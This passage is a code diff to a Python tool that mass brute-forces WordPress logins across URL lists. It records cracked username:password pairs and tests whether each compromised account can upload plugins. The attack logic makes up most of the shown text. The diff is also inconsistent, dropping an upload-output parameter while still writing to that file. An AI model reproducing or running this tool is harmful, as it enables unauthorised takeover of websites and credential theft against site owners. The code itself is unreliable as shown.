-                            if 'plugin-install.php' in accessible_plugins:
-                                print_status(f"Testing plugin upload capabilities for {url} - {credential}", "info")
-                                upload_task = asyncio.create_task(
-                                    async_test_plugin_upload(url, login_path, username, password, timeout, session, upload_output_file)
-                                )
-                                upload_methods, upload_successes = await upload_task
-                                
-                                if upload_successes:
-                                    print_status(f"🎯 PLUGIN UPLOAD AVAILABLE: {url} - {credential} - Methods: {len(upload_successes)}", "success")
-                                else:
-                                    print_status(f"❌ Plugin upload tested but failed: {url} - {credential}", "warning")
+                            # Test plugin upload if we have plugin access  
+                            print_status(f"Testing plugin upload for {url} - {credential}", "info")
+                            upload_task = asyncio.create_task(
+                                async_test_plugin_upload(url, login_path, username, password, timeout, session, output_file.replace('.txt', '_uploads.txt'))
+                            )
+                            upload_methods, successful_uploads = await upload_task
+                            
+                            if successful_uploads:
+                                print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {credential} - Methods: {', '.join([method for method, _ in successful_uploads])}", "success")
+                            else:
+                                print_status(f"❌ PLUGIN UPLOAD FAILED: {url} - {credential} - Tried: {', '.join(upload_methods)}", "warning")
                         else:
                             print_status(f"🔌 NO PLUGIN ACCESS: {url} - {credential}", "warning")
 
@@ -1292,8 +1167,8 @@ async def async_brute_force_users(url, login_path, usernames, timeout, workers, 
     print_status(f"Brute force completed on {url}. {total_attempts} attempts. {len(successful_logins)} successful logins.", "info")
     return successful_logins
 
-def brute_force_users(url, login_path, usernames, timeout, workers, verbose, output_file, upload_output_file,
-                      delay=0, state_file=None, max_attempts=50, common_passwords=None):
+def brute_force_users(url, login_path, usernames, timeout, workers, verbose, output_file, delay=0, 
+                      state_file=None, max_attempts=50, common_passwords=None):
     """Brute force WordPress login for the enumerated usernames"""
     if not usernames:
         return []
@@ -1343,15 +1218,16 @@ def brute_force_users(url, login_path, usernames, timeout, workers, verbose, out
                         if accessible_plugins:
                             print_status(f"🔌 PLUGIN ACCESS: {url} - {credential} - Access to: {', '.join(accessible_plugins)}", "success")
                             
-                            # Test plugin upload if plugin access is available
-                            if 'plugin-install.php' in accessible_plugins:
-                                print_status(f"Testing plugin upload capabilities for {url} - {credential}", "info")
-                                upload_methods, upload_successes = test_plugin_upload(url, login_path, username, password, timeout, upload_output_file)
-                                
-                                if upload_successes:
-                                    print_status(f"🎯 PLUGIN UPLOAD AVAILABLE: {url} - {credential} - Methods: {len(upload_successes)}", "success")
-                                else:
-                                    print_status(f"❌ Plugin upload tested but failed: {url} - {credential}", "warning")
+                            # Test plugin upload if we have plugin access
+                            print_status(f"Testing plugin upload for {url} - {credential}", "info")
+                            upload_methods, successful_uploads = test_plugin_upload(
+                                url, login_path, username, password, timeout, output_file.replace('.txt', '_uploads.txt')
+                            )
+                            
+                            if successful_uploads:
+                                print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {credential} - Methods: {', '.join([method for method, _ in successful_uploads])}", "success")
+                            else:
+                                print_status(f"❌ PLUGIN UPLOAD FAILED: {url} - {credential} - Tried: {', '.join(upload_methods)}", "warning")
                         else:
                             print_status(f"🔌 NO PLUGIN ACCESS: {url} - {credential}", "warning")
 
@@ -1444,7 +1320,7 @@ async def async_process_single_site(url, args, targets_completed=None):
 
             results = await async_brute_force_users(
                 normalized_url, login_path, usernames, args.timeout, args.workers, 
-                args.verbose, args.output, args.upload_output, args.delay, 
+                args.verbose, args.output, args.delay, 
                 args.state_file if args.resume else None,
                 args.max_login_attempts, common_passwords
             )
@@ -1511,7 +1387,7 @@ def process_single_site(url, args, targets_completed=None):
 
         results = brute_force_users(
             normalized_url, login_path, usernames, args.timeout, args.workers, 
-            args.verbose, args.output, args.upload_output, args.delay, 
+            args.verbose, args.output, args.delay, 
             args.state_file if args.resume else None,
             args.max_login_attempts, common_passwords
         )
@@ -1568,17 +1444,18 @@ async def async_process_url_list(url_list_file, args):
     print_status(f"Loaded {len(urls_to_process)} URLs to process from {url_list_file}")
     print_status(f"Already completed: {len(state['targets_completed'])} URLs")
 
-    # Create output files with headers if not resuming
+    # Create output file with header if not resuming
     if not args.resume or not os.path.exists(args.output):
         with open(args.output, 'w') as f:
             f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
             f.write("# Format: [Timestamp] URL - username:password\n")
             f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")
     
+    # Create plugin upload output file with header if not resuming
     if not args.resume or not os.path.exists(args.upload_output):
         with open(args.upload_output, 'w') as f:
             f.write(f"# WordPress Plugin Upload Successes - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write("# Format: [Timestamp] URL - username:password - Method: upload_method - Plugin URL: test_url\n\n")
+            f.write("# Format: [Timestamp] URL - username:password - Upload Method - Plugin URL\n\n")
 
     # Process URLs with limited concurrency
     sem = asyncio.Semaphore(args.site_workers)
@@ -1617,7 +1494,6 @@ async def async_process_url_list(url_list_file, args):
     print_status(f"\n{'='*50}")
     print_status(f"SCAN COMPLETE - {len(all_successful_logins)} successful logins found", "success")
     print_status(f"Results saved to {args.output}")
-    print_status(f"Plugin upload results saved to {args.upload_output}")
     print_status(f"{'='*50}")
 
 def process_url_list(url_list_file, args):
@@ -1653,17 +1529,18 @@ def process_url_list(url_list_file, args):
     print_status(f"Loaded {len(urls_to_process)} URLs to process from {url_list_file}")
     print_status(f"Already completed: {len(state['targets_completed'])} URLs")
 
-    # Create output files with headers if not resuming
+    # Create output file with header if not resuming
     if not args.resume or not os.path.exists(args.output):
         with open(args.output, 'w') as f:
             f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
             f.write("# Format: [Timestamp] URL - username:password\n")
             f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")
     
+    # Create plugin upload output file with header if not resuming
     if not args.resume or not os.path.exists(args.upload_output):
         with open(args.upload_output, 'w') as f:
             f.write(f"# WordPress Plugin Upload Successes - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write("# Format: [Timestamp] URL - username:password - Method: upload_method - Plugin URL: test_url\n\n")
+            f.write("# Format: [Timestamp] URL - username:password - Upload Method - Plugin URL\n\n")
 
     # Process URLs with ThreadPoolExecutor for concurrency
     all_successful_logins = []
@@ -1720,7 +1597,6 @@ def process_url_list(url_list_file, args):
     print_status(f"\n{'='*50}")
     print_status(f"SCAN COMPLETE - {len(all_successful_logins)} successful logins found", "success")
     print_status(f"Results saved to {args.output}")
-    print_status(f"Plugin upload results saved to {args.upload_output}")
     print_status(f"{'='*50}")
 
 async def async_main():
@@ -1728,11 +1604,10 @@ async def async_main():
     args = parse_args()
 
     try:
-        # Create output directories if they don't exist
-        for output_file in [args.output, args.upload_output]:
-            output_dir = os.path.dirname(output_file)
-            if output_dir and not os.path.exists(output_dir):
-                os.makedirs(output_dir)
+        # Create output directory if it doesn't exist
+        output_dir = os.path.dirname(args.output)
+        if output_dir and not os.path.exists(output_dir):
+            os.makedirs(output_dir)
 
         if args.url_list:
             await async_process_url_list(args.url_list, args)
@@ -1746,17 +1621,18 @@ async def async_main():
                 state = load_state(args.state_file)
                 targets_completed = state['targets_completed']
             
-            # Initialize output files if not resuming
+            # Initialize output file if not resuming
             if not args.resume or not os.path.exists(args.output):
                 with open(args.output, 'w') as f:
                     f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                     f.write("# Format: [Timestamp] URL - username:password\n")
                     f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")
             
+            # Initialize plugin upload output file
             if not args.resume or not os.path.exists(args.upload_output):
                 with open(args.upload_output, 'w') as f:
                     f.write(f"# WordPress Plugin Upload Successes - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                    f.write("# Format: [Timestamp] URL - username:password - Method: upload_method - Plugin URL: test_url\n\n")
+                    f.write("# Format: [Timestamp] URL - username:password - Upload Method - Plugin URL\n\n")
 
             successful_logins = await async_process_single_site(args.target, args, targets_completed)
 
@@ -1766,7 +1642,6 @@ async def async_main():
                 for login in successful_logins:
                     print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {normalized_url} - {login}")
                 print_status(f"Results saved to {args.output}")
-                print_status(f"Plugin upload results saved to {args.upload_output}")
                 print_status(f"{'='*50}")
 
     except KeyboardInterrupt:
@@ -1790,11 +1665,10 @@ def main():
         return
 
     try:
-        # Create output directories if they don't exist
-        for output_file in [args.output, args.upload_output]:
-            output_dir = os.path.dirname(output_file)
-            if output_dir and not os.path.exists(output_dir):
-                os.makedirs(output_dir)
+        # Create output directory if it doesn't exist
+        output_dir = os.path.dirname(args.output)
+        if output_dir and not os.path.exists(output_dir):
+            os.makedirs(output_dir)
 
         if args.url_list:
             process_url_list(args.url_list, args)
@@ -1808,17 +1682,18 @@ def main():
                 state = load_state(args.state_file)
                 targets_completed = state['targets_completed']
             
-            # Initialize output files if not resuming
+            # Initialize output file if not resuming
             if not args.resume or not os.path.exists(args.output):
                 with open(args.output, 'w') as f:
                     f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                     f.write("# Format: [Timestamp] URL - username:password\n")
                     f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")
             
+            # Initialize plugin upload output file
             if not args.resume or not os.path.exists(args.upload_output):
                 with open(args.upload_output, 'w') as f:
                     f.write(f"# WordPress Plugin Upload Successes - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                    f.write("# Format: [Timestamp] URL - username:password - Method: upload_method - Plugin URL: test_url\n\n")
+                    f.write("# Format: [Timestamp] URL - username:password - Upload Method - Plugin URL\n\n")
 
             successful_logins = process_single_site(args.target, args, targets_completed)
 
@@ -1828,7 +1703,6 @@ def main():
                 for login in successful_logins:
                     print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {normalized_url} - {login}")
                 print_status(f"Results saved to {args.output}")
-                print_status(f"Plugin upload results saved to {args.upload_output}")
                 print_status(f"{'='*50}")
 
     except KeyboardInterrupt:
